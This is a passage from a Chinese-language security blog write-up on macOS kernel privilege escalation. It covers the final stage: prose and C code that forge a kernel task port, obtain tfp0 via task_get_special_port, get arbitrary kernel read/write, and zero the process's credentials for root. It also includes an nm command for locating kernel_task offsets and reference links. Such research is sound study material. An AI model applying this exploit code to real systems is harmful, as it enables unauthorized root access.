class="keyword">sizeof</span>(<span class="keyword">int</span>));</div><div class="line">    AUDIT_MACH_SYSCALL_EXIT(err);</div><div class="line">    <span class="keyword">return</span> err;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//pid_for_task_args</span></div><div class="line"><span class="keyword">struct</span> pid_for_task_args&#123;</div><div class="line">    PAD_ARG(<span class="keyword">mach_port_name_t</span> t);</div><div class="line">    PAD_ARG(user_addr_r pid);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-30%20%E4%B8%8B%E5%8D%882.41.22.png" alt="pid_for_task"></p>
<ol>
<li>tfp0</li>
</ol>
<p>整个的流程就是找到内核的进程链表，遍历找到自己的进程的地址和<code>pid0</code>的地址。然后根据内核进程拿到<code>kernel task</code>的地址，再从<code>kernel task</code>中获取<code>itk_sself(kernel task&#39;s port)</code>，然后将<code>kernel task</code>的信息覆盖我们伪造的<code>ipc port</code>的信息，再将<code>fake port</code>指向伪造的<code>kernel task</code>，把<code>kernel task</code>的<code>bootstrap port</code>设置为真实的<code>kernel task</code>的port，然后就可以通过接口<code>task_get_special_port</code>拿到<code>kernel task</code>的<code>port</code>，从而实现任意地址读写，把我们自己的<code>proc</code>权限改写成<code>root</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint64_t</span> kern_task = <span class="number">0</span>;</div><div class="line">kr32(kernproc+<span class="number">0x18</span>, (<span class="keyword">int32_t</span>*)&amp;kern_task);</div><div class="line">kr32(kernproc+<span class="number">0x18</span>+<span class="number">4</span> , (<span class="keyword">int32_t</span>*)(((<span class="keyword">uint64_t</span>)(&amp;kern_task)) + <span class="number">4</span>));</div><div class="line">    </div><div class="line"><span class="keyword">uint64_t</span> itk_kern_sself = <span class="number">0</span>;</div><div class="line">kr32(kern_task+<span class="number">0xe8</span>, (<span class="keyword">int32_t</span>*)&amp;itk_kern_sself);</div><div class="line">kr32(kern_task+<span class="number">0xe8</span>+<span class="number">4</span> , (<span class="keyword">int32_t</span>*)(((<span class="keyword">uint64_t</span>)(&amp;itk_kern_sself)) + <span class="number">4</span>));</div><div class="line">    </div><div class="line"><span class="keyword">char</span> *faketaskport = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</div><div class="line"><span class="keyword">char</span> *ktaskdump = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</div><div class="line">    </div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>/<span class="number">4</span>; i++) &#123;</div><div class="line">    kr32(itk_kern_sself+i*<span class="number">4</span>, (<span class="keyword">int32_t</span>*)(&amp;faketaskport[i*<span class="number">4</span>]));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>/<span class="number">4</span>; i++) &#123;</div><div class="line">    kr32(kern_task+i*<span class="number">4</span>, (<span class="keyword">int32_t</span>*)(&amp;ktaskdump[i*<span class="number">4</span>]));</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="comment">//dump kernel task port</span></div><div class="line"><span class="built_in">memcpy</span>(fakeport, faketaskport, <span class="number">0x1000</span>);</div><div class="line"><span class="built_in">memcpy</span>(faketask, ktaskdump, <span class="number">0x1000</span>);</div><div class="line"></div><div class="line"></div><div class="line">*(<span class="keyword">uint64_t</span>*)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = faketask;</div><div class="line">*(<span class="keyword">uint64_t</span>*)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0xa0</span>) = <span class="number">0xff</span>;</div><div class="line"></div><div class="line">*(<span class="keyword">uint64_t</span>*)(((<span class="keyword">uint64_t</span>)faketask) + <span class="number">0x2b8</span>) = itk_kern_sself;</div><div class="line"></div><div class="line"><span class="comment">//get kernel task</span></div><div class="line">task_get_special_port(foundport, <span class="number">4</span>, &amp;tfp0);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"tfp0 = 0x%x\n"</span>, tfp0);</div><div class="line"></div><div class="line">fakeport-&gt;io_bits = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">uint64_t</span> slide;</div><div class="line">slide = kernel_base - <span class="number">0xFFFFFF8000200000</span>;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"kernel_base=0x%llx slide=0x%llx header=0x%llx\n"</span>,kernel_base, slide,ReadAnywhere64(kernel_base));</div><div class="line"></div><div class="line"><span class="comment">//get root</span></div><div class="line"><span class="keyword">uint64_t</span> cred = ReadAnywhere64(myproc+<span class="number">0xe8</span>);</div><div class="line">WriteAnywhere64(cred+<span class="number">0x18</span>,<span class="number">0</span>);</div></pre></td></tr></table></figure>
<p>有一点如果知道会轻松很多，那就是寻找便宜的时候可以通过下面命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">☁  ~  nm /System/Library/Kernels/kernel | grep kernel_task</div><div class="line">ffffff8000a9b198 S _kernel_task</div><div class="line">ffffff8000294ec0 T _kernel_task_create</div></pre></td></tr></table></figure>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-07-30%20%E4%B8%8B%E5%8D%885.40.37.png" alt="pwn"></p>
<h1 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02.参考链接"></a>0x02.参考链接</h1><ul>
<li><a href="https://bbs.pediy.com/thread-201121.htm" target="_blank" rel="external">ool msg</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1004" target="_blank" rel="external">project zero</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916646.24000001.19.eXT850&amp;articleid=781" target="_blank" rel="external">zheng min</a></li>
<li><a href="https://github.com/kpwn/yalu102" target="_blank" rel="external">Yalu102</a></li>
<li>And thanks for the help of shrek_wzw</li>
</ul>

  </div>
</article>



      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/Peterpan0927">Github</a></li>
         
          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00.前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞产生点"><span class="toc-number">2.</span> <span class="toc-text">0x01.漏洞产生点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-利用步骤"><span class="toc-number">3.</span> <span class="toc-text">0x01.利用步骤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x02.参考链接</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&text=通过堆风水绕过内核保护提权"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&is_video=false&description=通过堆风水绕过内核保护提权"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=通过堆风水绕过内核保护提权&body=Check out this article: https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&title=通过堆风水绕过内核保护提权"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan980927.cn/2018/07/29/通过堆风水绕过内核保护提权/&name=通过堆风水绕过内核保护提权&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Peter pan
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/Peterpan0927">Github</a></li>
         
          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- Google Analytics -->

<!-- Disqus Comments -->


    </div>
</body>
</html>
